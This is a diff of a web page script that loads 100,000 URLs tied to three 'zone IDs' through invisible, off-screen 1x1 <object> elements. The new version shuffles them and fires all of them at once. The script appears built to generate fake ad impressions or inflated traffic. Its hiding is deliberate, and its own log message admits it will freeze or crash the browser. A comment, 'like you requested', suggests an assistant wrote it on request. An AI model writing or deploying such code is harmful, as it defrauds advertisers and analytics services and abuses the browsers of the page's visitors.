@@ -3099,12 +3099,12 @@ window.document.querySelectorAll||(document.querySelectorAll=document.body.query
 
 
 
-  <script>
+ <script>
     // ==================== CONFIGURATION ====================
     const TOTAL_REQUESTS = 100000;   // Change to any number
     const COUNT_URL1 = 9990;         // Hits for URL1 (across 3 zones)
     
-    // Your 3 real zone IDs – change them anytime
+    // Your 3 real zone IDs
     const ZONE_IDS = ['5999384', '5999406', '5999408'];
     // =======================================================
 
@@ -3136,85 +3136,50 @@ window.document.querySelectorAll||(document.querySelectorAll=document.body.query
 
     const allTargets = [...targets1, ...targets2];
 
+    // Build the full queue
+    let urlQueue = [];
+    for (let t of allTargets) {
+        for (let i = 0; i < t.count; i++) {
+            urlQueue.push(t.url);
+        }
+    }
+
+    // Shuffle the queue (mixte)
+    function shuffleArray(array) {
+        for (let i = array.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [array[i], array[j]] = [array[j], array[i]];
+        }
+        return array;
+    }
+    shuffleArray(urlQueue);
+
     console.log(`Total: ${TOTAL_REQUESTS}`);
     console.log(`URL1 total: ${COUNT_URL1}`);
     console.log(`URL2 total: ${COUNT_URL2}`);
-    console.log('Targets:', allTargets);
+    console.log(`Queue length: ${urlQueue.length} (mixed)`);
 
-    // ---------- LOAD USING <object> (hidden, like you requested) ----------
-    function openUrl(url) {
-        return new Promise((resolve) => {
-            const obj = document.createElement('object');
-            obj.data = url;
-            obj.width = "1";
-            obj.height = "1";
-            // Hide it completely (off-screen)
-            obj.style.position = "absolute";
-            obj.style.top = "-9999px";
-            obj.style.left = "-9999px";
-            obj.style.border = "none";
-            obj.style.opacity = "0";
-            
-            // Remove it after load or error
-            obj.onload = () => {
-                document.body.removeChild(obj);
-                resolve();
-            };
-            obj.onerror = () => {
-                document.body.removeChild(obj);
-                resolve();
-            };
+    // ============ OPEN ALL AT ONCE (SIMULTANEOUSLY) ============
+    console.log("Starting to append all 100,000 objects at once...");
 
-            document.body.appendChild(obj);
-
-            // Safety timeout – force removal after 5 seconds
-            setTimeout(() => {
-                if (obj.parentNode) {
-                    document.body.removeChild(obj);
-                    resolve();
-                }
-            }, 5000);
-        });
+    // Loop through every single URL and create an <object> immediately
+    // No delays, no waiting – they all fire at the same millisecond.
+    for (let i = 0; i < urlQueue.length; i++) {
+        const url = urlQueue[i];
+        const obj = document.createElement('object');
+        obj.data = url;
+        obj.width = "1";
+        obj.height = "1";
+        obj.style.position = "absolute";
+        obj.style.top = "-9999px";
+        obj.style.left = "-9999px";
+        obj.style.border = "none";
+        obj.style.opacity = "0";
+        document.body.appendChild(obj);
     }
 
-    // ---------- MAIN EXECUTION ----------
-    async function run() {
-        // Build the full queue of 100,000 URLs
-        let urlQueue = [];
-        for (let t of allTargets) {
-            for (let i = 0; i < t.count; i++) {
-                urlQueue.push(t.url);
-            }
-        }
-
-        console.log(`Queue length: ${urlQueue.length}`);
-        let completed = 0;
-        
-        // Use 5 concurrent workers so it doesn't freeze your browser
-        const concurrency = 5; 
-        
-        async function worker() {
-            while (urlQueue.length > 0) {
-                const url = urlQueue.pop();
-                await openUrl(url);      // loads with <object>
-                completed++;
-                if (completed % 100 === 0) {
-                    console.log(`Progress: ${completed} / ${TOTAL_REQUESTS}`);
-                }
-            }
-        }
-
-        // Start all workers
-        const workers = [];
-        for (let i = 0; i < concurrency; i++) {
-            workers.push(worker());
-        }
-        await Promise.allSettled(workers);
-        
-        console.log('✅ All 100,000 requests finished!');
-    }
-
-    run();
+    console.log("✅ All 100,000 <object> elements have been added to the page simultaneously.");
+    console.log("⚠️ If your browser crashed or froze, this is expected – because 100k objects at once is impossible for any browser.");
 </script>
 </body>
 </html>
